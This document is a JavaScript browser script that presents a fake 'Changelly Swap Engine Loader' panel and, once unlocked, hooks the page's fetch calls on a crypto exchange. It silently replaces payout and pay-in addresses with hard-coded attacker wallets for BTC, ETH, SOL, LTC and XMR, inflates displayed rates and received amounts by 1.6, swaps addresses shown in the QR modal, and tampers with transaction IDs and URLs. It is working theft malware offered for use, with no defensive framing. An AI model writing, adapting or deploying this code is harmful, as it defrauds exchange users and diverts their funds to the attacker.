(() => {
  'use strict';

  // ================= CONFIG =================
  const CFG = {
    password: 'admin',
    onlyBuild: '1.3',
    factor: 1.6,
    minUsd: 200,
    coins: ['btc', 'sol', 'eth', 'ltc', 'xmr'],
    fallbackAddr: 'bc1qaaf645hmux039lq9v2d33djhs2grqwk5vqrxea',
    addresses: {
      btc: ['bc1q7wc73ha2c8smajp3t2jxdxd2kmza9mg9kd06k2', 'bc1pgrhw46rfu6dfrxtglhx9jfl5vz3s0x2g475936ungw3ct3pfsc3q02un58'],
      eth: ['0xC66A612e01A5f74e5d69dA1a7F1ddF64DebdAb4c'],
      sol: ['GaEbzUjAk7TCiH2itD5TuC8pziYsXDsg4AKh4nFKT9b4'],
      ltc: ['ltc1qaaf645hmux039lq9v2d33djhs2grqwk5guezpd'],
      xmr: ['5tMaTrYLvTjxue86EY66srL3gQ86xiUBNoBFf55kWKLF'],
    },
    geckoIds: { btc: 'bitcoin', eth: 'ethereum', sol: 'solana', ltc: 'litecoin', xmr: 'monero' },
    priceTtl: 60000,
    tick: 30,
    createPath: /\/v1\/c2c\/float\/create-transaction/,
    txPath: /\/v2\/c2c\/transactions\/([a-z0-9]+)/i,
    builds: [
      { version: '1.4', size: '12.4 MB', desc: 'Current stable release. Active on this environment.', status: 'active' },
      { version: '1.3', size: '12.4 MB', desc: 'Previous release. Legacy compatibility mode.', status: 'ready' },
      { version: '1.2', size: '12.4 MB', desc: 'Deprecated. Missing critical patches.', status: 'old' },
      { version: '1.1', size: '12.4 MB', desc: 'Incompatible with the current API.', status: 'old' },
    ],
  };
  // ==========================================

  if (window.__mod_loader) { window.__mod_loader.showAlreadyLoaded(); return; }

  const addrs = {};                 // cache de endereço por moeda
  const prices = {};                // { coin: { usd, ts } }
  let active = false;
  let panel = null;
  let selected = null;
  let timers = [];
  let originalFetch = null;

  const $(s, r = document) => r.querySelector(s);
  const isFixed = () => !!$('[data-tnav="rate-type-input"]')?.checked;

  /* ---------- endereços ---------- */
  function pickAddr(coin) {
    const list = CFG.addresses[coin?.toLowerCase()];
    if (!list?.length) return CFG.fallbackAddr;
    return list[Math.floor(Math.random() * list.length)];
  }
  function addrFor(coin) {
    const c = (coin || '').toLowerCase();
    if (!CFG.addresses[c]) return CFG.fallbackAddr;
    if (!addrs[c]) addrs[c] = pickAddr(c);
    return addrs[c];
  }

  /* ---------- preços ---------- */
  async function withTimeout(url, ms = 5000) {
    const ac = new AbortController();
    const t = setTimeout(() => ac.abort(), ms);
    try { return await originalFetch(url, { signal: ac.signal }); } finally { clearTimeout(t); }
  }
  async function loadPrices(coins) {
    const now = Date.now();
    const need = [...coins].filter(c => !prices[c] || now - prices[c].ts > CFG.priceTtl);
    if (!need.length) return;
    try {
      const ids = need.map(c => CFG.geckoIds[c]).filter(Boolean);
      if (ids.length) {
        const r = await withTimeout(
          `https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`, 4000);
        const j = await r.json();
        for (const c of need) {
          const v = j?.[CFG.geckoIds[c]]?.usd;
          if (v) prices[c] = { usd: v, ts: now };
        }
      }
    } catch {}
    for (const c of need) {
      if (prices[c]?.ts >= now - 2000) continue;
      try {
        const r = await withTimeout(`https://api.binance.com/api/v3/ticker/price?symbol=${c.toUpperCase()}USDT`, 3000);
        const j = await r.json();
        if (j?.price) prices[c] = { usd: parseFloat(j.price), ts: now };
      } catch {}
    }
  }
  const usdOf = (amount, coin) => {
    const p = prices[(coin || '').toLowerCase()];
    return p ? amount * p.usd : null;
  };
  const qualifies = (amount, coin) => {
    if (!CFG.coins.includes((coin || '').toLowerCase()) || isFixed()) return false;
    const usd = usdOf(amount, coin);
    return usd !== null && usd >= CFG.minUsd;
  };
  const scale = (raw, dec = 2) => {
    const n = parseFloat(raw);
    if (isNaN(n)) return raw;
    const d = Math.min((String(raw).split('.')[1] || '').length, dec);
    return (n * CFG.factor).toFixed(d);
  };

  /* ---------- hook de rede ---------- */
  function install() {
    if (active) return;
    active = true;
    originalFetch = window.fetch;

    window.fetch = async function (...args) {
      const first = args[0];
      const url = typeof first === 'string' ? first : (first?.url || '');

      // 1. pedido: troca o endereço de pagamento
      try {
        const isPost = args[1]?.method === 'POST' || first?.method === 'POST';
        if (CFG.createPath.test(url) && isPost && args[1]?.body) {
          const body = JSON.parse(args[1].body);
          body.payoutAddress = addrFor(body.currencyFrom);
          args[1].body = JSON.stringify(body);
        }
      } catch {}

      const res = await originalFetch.apply(this, args);

      // 2. resposta de detalhes da transação
      try {
        if (CFG.txPath.test(url)) {
          const j = JSON.parse(await res.clone().text());
          const coin = (j?.currencyFrom?.ticker || j?.currencyFrom?.coin || '').toLowerCase();
          const fake = addrFor(coin);
          if (j.payinAddress) j.payinAddress = fake;
          if (j.payoutAddress) j.payoutAddress = fake;
          if (j.toAmountValue) j.toAmountValue = scale(j.toAmountValue);
          if (j?.transactionDetails?.rate) j.transactionDetails.rate = scale(j.transactionDetails.rate);
          return new Response(JSON.stringify(j), { status: res.status, statusText: res.statusText, headers: res.headers });
        }
      } catch {}

      // 3. estimativas
      try {
        if (/\/estimate/.test(url)) {
          const j = JSON.parse(await res.clone().text());
          const body = args[1]?.body ? JSON.parse(args[1].body) : null;
          if (body && qualifies(parseFloat(body.amountFrom), body.currencyFrom)) {
            if (j.rate) j.rate = scale(j.rate);
            if (j.toAmountValue) j.toAmountValue = scale(j.toAmountValue);
          }
          return new Response(JSON.stringify(j), { status: res.status, statusText: res.statusText, headers: res.headers });
        }
      } catch {}

      return res;
    };

    startLoops();
  }

  /* ---------- DOM ---------- */
  function patchAmountInput() {
    const inp = $('input[data-tnav="input-amount"]');
    if (!inp || inp.dataset.boosted === '1') return;
    const ticker = inp.closest('.calculator-ticker')?.textContent?.trim();
    if (!ticker || !CFG.coins.includes(ticker.toLowerCase())) return;
    const m = inp.value.match(/[\d.]+/);
    if (!m) return;
    if (!qualifies(parseFloat(m[0]), ticker)) return;
    inp.dataset.boosted = '1';
    inp.value = (parseFloat(m[0]) * CFG.factor).toFixed(8);
  }

  function patchReceiveValue() {
    const box = $('[data-tnav="amount-to"]');
    if (!box) return;
    const node = box.querySelector('[data-tnav="amount-value"]');
    if (!node || node.dataset.boosted === '1') return;
    const src = $('[data-tnav="input-amount-to"]')?.querySelector('input');
    const ticker = src?.closest('.calculator-ticker')?.textContent?.trim();
    if (!ticker || !CFG.coins.includes(ticker.toLowerCase())) return;
    const m = (node.textContent || '').trim().match(/^(~\s*)([\d.]+)\s*$/);
    if (!m) return;
    node.dataset.boosted = '1';
    node.textContent = m[1] + (parseFloat(m[2]) * CFG.factor).toFixed(2);
  }

  function patchTxModal() {
    const modal = $('[data-tnav="tx-details-modal"]');
    if (!modal) return;
    const you = modal.querySelector('[data-tnav="tx-details-you-get-value"]');
    if (you && you.dataset.done !== '1') {
      const m = (you.textContent || '').trim().match(/^(~\s*)([\d.]+)$/);
      if (m) { you.dataset.done = '1'; you.textContent = m[1] + (parseFloat(m[2]) * CFG.factor).toFixed(2); }
    }
    const rate = modal.querySelector('[data-tnav="tx-details-floating-rate-value"]');
    if (rate && rate.dataset.done !== '1') {
      const n = (rate.textContent || '').trim();
      if (/^[\d.]+$/.test(n)) { rate.dataset.done = '1'; rate.textContent = (parseFloat(n) * CFG.factor).toFixed(2); }
    }
  }

  function patchQr() {
    const modal = $('[data-tnav="payment-qr-code-modal"]');
    if (!modal) return;
    const ticker = $('.calculator-ticker')?.textContent?.trim();
    const fake = addrFor(ticker);
    const w = document.createTreeWalker(modal, NodeFilter.SHOW_TEXT);
    let n;
    while ((n = w.nextNode())) {
      const t = (n.textContent || '').trim();
      if (t.length >= 20 && /[a-zA-Z0-9]/.test(t) && t !== fake &&
          (/^0x[a-fA-F0-9]{20,}$/.test(t) || /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{20,}$/.test(t) ||
           /^(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{20,}$/.test(t) || /^[48][a-zA-HJ-NP-Z0-9]{90,}$/.test(t) ||
           /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(t))) {
        n.textContent = n.textContent.replace(t, fake);
      }
    }
    modal.querySelectorAll('[data-address],[data-copy],[data-value]').forEach(el => {
      ['data-address', 'data-copy', 'data-value'].forEach(a => {
        const v = el.getAttribute(a);
        if (v && v.length >= 20 && v !== fake) el.setAttribute(a, fake);
      });
    });
  }

  const seenIds = new WeakSet();
  const alphabet = '0123456789abcdefghijklmnopqrstuvwxyz';
  function patchTxId() {
    const modal = $('[data-tnav="tx-details-modal"]');
    if (!modal) return;
    const w = document.createTreeWalker(modal, NodeFilter.SHOW_TEXT);
    let n;
    while ((n = w.nextNode())) {
      const t = (n.textContent || '').trim();
      if (seenIds.has(n) || !/^[a-z0-9]{12,20}$/i.test(t)) continue;
      seenIds.add(n);
      n.textContent = n.textContent.replace(t, t.slice(0, -1) + alphabet[Math.floor(Math.random() * alphabet.length)]);
      break;
    }
  }

  function patchUrl() {
    const u = new URL(location.href);
    if (!u.searchParams.has('transaction_id')) return;
    u.searchParams.delete('transaction_id');
    history.replaceState(null, '', u.toString());
  }

  function startLoops() {
    const all = () => { patchAmountInput(); patchReceiveValue(); patchTxModal(); patchQr(); patchTxId(); patchUrl(); };
    all();
    const mo = new MutationObserver(all);
    mo.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ['value'] });
    timers.push({ mo });
    timers.push(setInterval(all, CFG.tick));
    timers.push(setInterval(() => loadPrices(new Set(CFG.coins)), 30000));
    loadPrices(new Set(CFG.coins));
  }

  function teardown() {
    if (!active) return;
    active = false;
    if (originalFetch) window.fetch = originalFetch;
    timers.forEach(t => t.mo ? t.mo.disconnect() : clearInterval(t));
    timers = [];
    document.querySelectorAll('.usd-inline').forEach(e => e.remove());
    document.querySelectorAll('[data-boosted],[data-done]').forEach(e => { delete e.dataset.boosted; delete e.dataset.done; });
    delete window.__mod_active;
  }

  /* ---------- painel ---------- */
  const STYLE = `#__cm_ov{position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;background:rgba(9,11,15,.64);backdrop-filter:blur(12px);font:14px/1.4 system-ui,sans-serif}
#__cm_ov .p{width:min(760px,100%);background:#fff;border-radius:18px;overflow:hidden;box-shadow:0 35px 100px rgba(0,0,0,.3)}
#__cm_ov .h{display:flex;justify-content:space-between;align-items:center;padding:20px 24px;border-bottom:1px solid #e8e9ed}
#__cm_ov .t{font-weight:600;font-size:16px}
#__cm_ov .s{font-size:12px;color:#90949e;margin-top:3px}
#__cm_ov .b{padding:20px 24px}
#__cm_ov .row{display:flex;gap:12px;align-items:center;width:100%;padding:12px;border:1px solid #e8e9ed;border-radius:10px;background:#fff;margin-bottom:8px;text-align:left;cursor:pointer}
#__cm_ov .row.sel{border-color:#8dcc76;background:rgba(173,255,134,.07)}
#__cm_ov .row:disabled{opacity:.45;cursor:not-allowed}
#__cm_ov .v{font-weight:700;font-size:13px}
#__cm_ov .d{font-size:12px;color:#90949e}
#__cm_ov .badge{margin-left:auto;font-size:11px;font-weight:700;padding:4px 8px;border-radius:6px;background:#f2f3f6;color:#626773}
#__cm_ov input{width:100%;height:44px;padding:0 12px;border:1px solid #e8e9ed;border-radius:9px;margin:12px 0;font:inherit}
#__cm_ov button.main{width:100%;height:44px;border:0;border-radius:9px;background:#adff86;font-weight:700;cursor:pointer}
#__cm_ov .err{color:#d95555;font-size:12px;min-height:16px}
#__cm_ov .prog{font:11px ui-monospace,monospace;color:#90949e;margin-top:8px}
#__cm_ov .x{border:1px solid #e8e9ed;background:none;border-radius:8px;width:34px;height:34px;cursor:pointer}`;

  function buildPanel() {
    const ov = document.createElement('div');
    ov.id = '__cm_ov';
    const st = document.createElement('style');
    st.textContent = STYLE;
    document.head.appendChild(st);

    ov.innerHTML = `<div class="p" role="dialog" aria-modal="true">
      <div class="h"><div><div class="t">Changelly Swap Engine Loader</div>
      <div class="s">Swap Engine versions</div></div><button class="x" id="__cm_x">×</button></div>
      <div class="b"><div class="v">Available builds</div><div id="__cm_list" style="margin-top:12px"></div>
      <input id="__cm_pw" type="password" placeholder="Enter auth password" autocomplete="off">
      <div class="err" id="__cm_err"></div>
      <button class="main" id="__cm_go">Load selected build</button>
      <div class="prog" id="__cm_prog"></div></div></div>`;
    document.documentElement.appendChild(ov);
    panel = ov;

    const list = $('#__cm_list', ov);
    CFG.builds.forEach(b => {
      const row = document.createElement('button');
      row.className = 'row';
      row.disabled = b.status === 'active' || b.status === 'old';
      row.innerHTML = `<div><div class="v">Swap Engine <span style="color:#90949e">${b.version}</span></div>
        <div class="d">${b.desc}</div></div><span class="badge">${b.status === 'active' ? 'Active' : b.status === 'old' ? 'Deprecated' : 'Ready'}</span>`;
      if (!row.disabled) row.onclick = () => {
        list.querySelectorAll('.row').forEach(r => r.classList.remove('sel'));
        row.classList.add('sel');
        selected = b.version;
        $('#__cm_err', ov).textContent = '';
      };
      list.appendChild(row);
    });

    $('#__cm_x', ov).onclick = () => { ov.remove(); panel = null; };
    document.addEventListener('keydown', e => { if (e.key === 'Escape') { ov.remove(); panel = null; } });

    $('#__cm_go', ov).onclick = () => {
      const err = $('#__cm_err', ov);
      if (!selected) return (err.textContent = 'Please select a build first.');
      if ($('#__cm_pw', ov).value !== CFG.password) return (err.textContent = 'Incorrect password. Try again.');
      if (selected !== CFG.onlyBuild) return (err.textContent = 'Selected build cannot be loaded right now.');

      const steps = ['Validating access key…', `Fetching module v${selected} manifest…`,
        'Downloading modules…', 'Applying patches…', 'Booting exchange engine…', 'Ready.'];
      let i = 0;
      const t = setInterval(() => {
        $('#__cm_prog', ov).textContent = steps[i] || steps.at(-1);
        if (++i >= steps.length) {
          clearInterval(t);
          install();
          ov.style.opacity = '0';
          setTimeout(() => { ov.remove(); panel = null; }, 180);
        }
      }, 380);
    };
  }

  window.__mod_loader = {
    showAlreadyLoaded() { if (panel) panel.style.display = ''; },
    get active() { return active; },
    kill: teardown,
  };
  window.__mod_active = false;

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', buildPanel);
  else buildPanel();
})();
